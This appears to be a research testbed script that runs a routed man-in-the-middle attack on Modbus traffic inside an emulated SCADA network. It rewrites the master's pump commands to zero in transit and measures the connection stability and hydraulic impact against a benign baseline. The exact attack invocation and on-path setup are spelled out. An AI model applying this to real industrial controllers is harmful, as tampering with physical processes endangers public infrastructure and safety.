#!/usr/bin/env python3
"""Live in-transit Modbus MITM on CORE — L3-ROUTED (attacker is the router).

The attacker sits on the routed path *legitimately*: the MTU and the PLC are on
two different SCADA subnets and the ATK node is the router between them, so all
MTU<->PLC traffic is forwarded through ATK with NO ARP poisoning. ATK REDIRECTs
the transit :502 connection into the transparent proxy and rewrites the command
in transit. Because the attacker is genuinely on-path, the MTU's **persistent**
connection stays stable (the failure mode of the ARP variant), so we can
distinguish COMMAND MODIFICATION from CONNECTION DISRUPTION.

    SCADA-A 10.0.1.0/24 :  MTU(.10)                 ── SW_A ──┐
                                                              ATK (router .254/.254, proxy+rewrite)
    SCADA-B 10.0.2.0/24 :  PLC(.10, Modbus :502)    ── SW_B ──┘
    back channel 172.16.0.0/24 :  PLC(.1)  APP(.254)   (gateway path, NOT via ATK)

EPANET, the gateway and the hydraulic scenario are unchanged; the MTU keeps its
normal persistent connection and control behaviour.

    SCADAVT_DIR=$PWD SCADAVT_NODE_PY=$PWD/.venv/bin/python \
        /opt/core/venv/bin/python tools/live_core_mitm_l3.py

Clean benign baseline first, then the attack. Dual-interface PCAP + three-way
values + hydraulic trace. Does not claim a clean cyber-physical result unless the
connection stayed up AND the values were modified AND the tank diverged.
"""

from __future__ import annotations

import csv
import json
import os
import sys
import tempfile
import time

REPO = os.environ.get("SCADAVT_DIR") or os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)

from tools.live_core_closed_loop import NODE_PY, PREFIX, launch, nrun, read_level  # noqa: E402
from tools.live_core_mitm import fc16_values, sample_trace, set_window  # noqa: E402
from core.api.grpc import client, wrappers  # noqa: E402
from core.api.grpc.wrappers import NodeType, Position  # noqa: E402
from scadavt.core import coregen  # noqa: E402

PASS, FAIL = [], []


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    print(f"   [{'PASS' if cond else 'FAIL'}] {name}" + (f"  — {detail}" if detail else ""))
    return cond


def levels(rows):
    return [r[1] for r in rows if r[1] is not None]


def frac0(rows, i):
    v = [r[i] for r in rows if r[i] is not None]
    return (sum(x < 0.1 for x in v) / len(v)) if v else 0.0


def three_way(core, sid, mtu, appn, sess):
    _, cmdout = nrun(core, sid, mtu, "grep CMD /tmp/MTU.log | tail -1")
    commanded = None
    if "{" in (cmdout or ""):
        try:
            commanded = json.loads(cmdout[cmdout.index("{"):].strip()).get("P1")
        except Exception:
            commanded = None
    _, pr = nrun(core, sid, mtu, f'{PREFIX} && {NODE_PY} -m scadavt.core.probe '
                                 f'--session {sess} --node PLC1 --point P1_SPD')
    try:
        received = float(pr.strip().split("=")[-1].split("@")[0])
    except Exception:
        received = None
    applied = read_level(core, sid, appn, ("172.16.0.254", 9000), point="P1_SET")
    return commanded, received, applied


def send_exceptions(core, sid, mtu):
    _, o = nrun(core, sid, mtu, "grep -c 'socket.send' /tmp/MTU.log || true")
    try:
        return int((o or "0").strip().split()[-1])
    except Exception:
        return -1


def main():
    cfg = json.loads(open(os.path.join(REPO, "scadavt", "scenarios",
                                        "closed_loop_min", "lab_speed.json")).read())
    cfg["devices"][0]["ip"] = "10.0.2.10"                 # PLC SCADA IP (subnet B)
    cfg["devices"][0]["backchannel"] = "172.16.0.1:9161"  # out-of-band (not via ATK)
    outdir = tempfile.mkdtemp(prefix="scadavt_mitm3_")
    coregen.write_session(cfg, outdir)
    os.chmod(outdir, 0o755)
    sess = os.path.join(outdir, "session.json")
    labpath = os.path.join(outdir, "lab.json")
    open(labpath, "w").write(json.dumps(cfg))
    evid = os.path.join(outdir, "evidence")
    os.makedirs(evid, exist_ok=True)
    ctl = "/tmp/mitm3_ctl.json"
    set_window(ctl, False)
    nrun_rm = None

    core = client.CoreGrpcClient()
    core.connect()
    s = core.create_session()
    sid = s.id
    swa = s.add_node(1, name="SW_A", _type=NodeType.SWITCH, position=Position(x=150, y=120))
    swb = s.add_node(2, name="SW_B", _type=NodeType.SWITCH, position=Position(x=450, y=120))
    swm = s.add_node(3, name="SW_M", _type=NodeType.SWITCH, position=Position(x=450, y=380))
    mtu = s.add_node(4, name="MTU", _type=NodeType.DEFAULT, model="PC", position=Position(x=150, y=240))
    plc = s.add_node(5, name="PLC1", _type=NodeType.DEFAULT, model="PC", position=Position(x=450, y=240))
    atk = s.add_node(6, name="ATK", _type=NodeType.DEFAULT, model="router", position=Position(x=300, y=120))
    appn = s.add_node(7, name="APP", _type=NodeType.DEFAULT, model="PC", position=Position(x=600, y=380))
    # SCADA-A: MTU + ATK leg
    s.add_link(node1=mtu, node2=swa, iface1=wrappers.Interface(0, ip4="10.0.1.10", ip4_mask=24), iface2=wrappers.Interface(0))
    s.add_link(node1=atk, node2=swa, iface1=wrappers.Interface(0, ip4="10.0.1.254", ip4_mask=24), iface2=wrappers.Interface(1))
    # SCADA-B: PLC + ATK leg
    s.add_link(node1=plc, node2=swb, iface1=wrappers.Interface(0, ip4="10.0.2.10", ip4_mask=24), iface2=wrappers.Interface(0))
    s.add_link(node1=atk, node2=swb, iface1=wrappers.Interface(1, ip4="10.0.2.254", ip4_mask=24), iface2=wrappers.Interface(1))
    # back-channel: PLC(iface1) + APP
    s.add_link(node1=plc, node2=swm, iface1=wrappers.Interface(1, ip4="172.16.0.1", ip4_mask=24), iface2=wrappers.Interface(0))
    s.add_link(node1=appn, node2=swm, iface1=wrappers.Interface(0, ip4="172.16.0.254", ip4_mask=24), iface2=wrappers.Interface(1))
    ok, warn = core.start_session(s)
    check("L3 MITM session started", ok, f"warnings={warn}")

    N = 220
    try:
        # routing: ATK forwards; MTU default -> ATK; PLC route back -> ATK
        nrun(core, sid, atk, "sysctl -w net.ipv4.ip_forward=1")
        nrun(core, sid, mtu, "ip route replace default via 10.0.1.254")
        nrun(core, sid, plc, "ip route replace 10.0.1.0/24 via 10.0.2.254")
        check("routing up: MTU can reach the PLC across the router (benign path)",
              nrun(core, sid, mtu, "ping -c2 -W1 10.0.2.10")[0] == 0)

        launch(core, sid, plc, f"scadavt.core.device --session {sess} --node PLC1 "
                               f"--modbus 10.0.2.10:502 --io 0.0.0.0:9161", "PLC1")
        launch(core, sid, appn, f"scadavt.examples.app_runner --config {labpath} "
                                f"--listen 172.16.0.254:9000", "APP")
        launch(core, sid, appn, f"scadavt.core.gateway_run --session {sess} --app 172.16.0.254:9000 "
                                f"--step 120 --cycles {N} --sleep 0.1", "GW")
        time.sleep(3.0)

        # bring up the L3 MITM (REDIRECT + proxy) BEFORE the MTU connects
        launch(core, sid, atk, f"scadavt.attacks.mitm --kind command --victim-ip 10.0.2.10 --no-arp "
                               f"--reg-type H --address 0 --mode const --value 0.0 --modbus-port 502 "
                               f"--proxy-port 7502 --iface eth0 --control {ctl} --log /tmp/mitm3.csv", "MITM")
        time.sleep(2.0)
        launch(core, sid, mtu, f"scadavt.core.master --session {sess} --node MTU --step 0.1 --cycles {N}", "MTU")
        time.sleep(3.0)
        base_exc = send_exceptions(core, sid, mtu)

        def cap_start(tag):
            pm = os.path.join(evid, f"{tag}_mtu.pcap")
            pp = os.path.join(evid, f"{tag}_plc.pcap")
            nrun(core, sid, mtu, f"bash -c 'rm -f {pm}; setsid tcpdump -i eth0 -w {pm} tcp port 502 "
                                 f">/tmp/tm.log 2>&1 </dev/null &'", wait=False)
            nrun(core, sid, plc, f"bash -c 'rm -f {pp}; setsid tcpdump -i eth0 -w {pp} tcp port 502 "
                                 f">/tmp/tp.log 2>&1 </dev/null &'", wait=False)
            return pm, pp

        def cap_stop():
            nrun(core, sid, mtu, "pkill -f 'tcpdump -i eth0' || true")
            nrun(core, sid, plc, "pkill -f 'tcpdump -i eth0' || true")
            time.sleep(0.4)

        # ---------------- BENIGN ----------------
        print("\n-- BENIGN (routed, proxy relaying, no rewrite) --")
        set_window(ctl, False)
        bm, bp = cap_start("benign")
        time.sleep(1.0)
        benign = sample_trace(core, sid, appn, mtu, sess, 10)
        b_cmd, b_recv, b_appl = three_way(core, sid, mtu, appn, sess)
        cap_stop()
        b_mtu, b_plc = fc16_values(bm), fc16_values(bp)
        benign_min = min(levels(benign)) if levels(benign) else None

        # ---------------- ATTACK ----------------
        print("\n-- ATTACK (rewrite the MTU's own write in transit) --")
        exc_before = send_exceptions(core, sid, mtu)
        set_window(ctl, True)
        am, ap = cap_start("attack")
        time.sleep(1.0)
        attack = sample_trace(core, sid, appn, mtu, sess, 12)
        a_cmd, a_recv, a_appl = three_way(core, sid, mtu, appn, sess)
        cap_stop()
        set_window(ctl, False)
        a_mtu, a_plc = fc16_values(am), fc16_values(ap)
        exc_after = send_exceptions(core, sid, mtu)
        attack_min = min(levels(attack)) if levels(attack) else None
        exc_during = exc_after - exc_before if (exc_after >= 0 and exc_before >= 0) else -1

        print("\n-- evidence --")
        print(f"   benign : cmd={b_cmd} recv={b_recv} appl={b_appl} "
              f"MTU-writes={sorted(set(b_mtu))} PLC-writes={sorted(set(b_plc))} level min~{benign_min}")
        print(f"   attack : cmd={a_cmd} recv0frac={frac0(attack,3):.2f} appl0frac={frac0(attack,2):.2f} "
              f"MTU-writes={sorted(set(a_mtu))} PLC-writes={sorted(set(a_plc))} level min~{attack_min}")
        print(f"   master socket.send exceptions during attack window: {exc_during}")

        # ---------------- classification ----------------
        conn_stable = (exc_during == 0) and len(a_mtu) > 0     # MTU kept writing, no socket errors
        check("CONNECTION STABLE (not disruption): the MTU kept its persistent session and "
              "kept writing through the attack (no socket errors)",
              conn_stable, f"send_exc_during={exc_during} MTU-side writes={len(a_mtu)}")
        # in-transit modification signature: a value (0) appears at the RECEIVER that the
        # SENDER never put on the wire. MTU side carries only legit values (never 0);
        # PLC side carries 0 (the rewrite). That difference = alteration in transit.
        mtu_never_zero = len(a_mtu) > 0 and all(v >= 0.5 for v in a_mtu)
        plc_has_zero = any(v < 0.1 for v in a_plc)
        check("COMMAND MODIFICATION in transit: the MTU never sends 0 on the wire, yet the PLC "
              "receives 0 — a value the sender never sent, altered between the two interfaces",
              mtu_never_zero and plc_has_zero,
              f"MTU-side={sorted(set(a_mtu))} (never 0) vs PLC-side has 0={plc_has_zero}")
        check("three-way divergence: received/applied forced to ~0 during the window",
              frac0(attack, 3) > 0.6 and frac0(attack, 2) > 0.6,
              f"recv0frac={frac0(attack,3):.2f} appl0frac={frac0(attack,2):.2f}")
        check("benign baseline clean: MTU and PLC both carry the real value, received not 0",
              (b_plc and all(v >= 0.5 for v in b_plc)) and b_recv is not None and b_recv >= 0.5,
              f"MTU={sorted(set(b_mtu))} PLC={sorted(set(b_plc))} recv={b_recv}")
        impact = (benign_min is not None and attack_min is not None and attack_min < benign_min - 0.5)
        clean_cyber_physical = (conn_stable and mtu_never_zero and plc_has_zero
                                and frac0(attack, 3) > 0.6 and impact)
        check("CLEAN CYBER-PHYSICAL MITM: stable connection + in-transit modification + hydraulic "
              "divergence (only claimed if all hold)",
              clean_cyber_physical, f"stable={conn_stable} modified={mtu_never_zero and plc_has_zero} "
              f"impact={impact} (benign min~{benign_min} vs attack min~{attack_min})")

        for name, rows in [("benign_trace.csv", benign), ("attack_trace.csv", attack)]:
            with open(os.path.join(evid, name), "w", newline="") as fh:
                w = csv.writer(fh)
                w.writerow(["wall_s", "T1_level_m", "P1_applied_setting", "P1_received_register"])
                w.writerows(rows)
        import shutil
        for src, dst in [("/tmp/mitm3.csv", "mitm_agent.csv"), ("/tmp/MTU.log", "commanded_mtu.log")]:
            try:
                shutil.copy(src, os.path.join(evid, dst))
            except Exception:
                pass
    finally:
        try:
            core.delete_session(sid)
        except Exception:
            pass

    print(f"\n  evidence: {evid}")
    print("=" * 60 + f"\n  RESULT   PASSED: {len(PASS)}   FAILED: {len(FAIL)}")
    for f in FAIL:
        print(f"    FAIL -> {f}")
    return 0 if not FAIL else 1


if __name__ == "__main__":
    raise SystemExit(main())
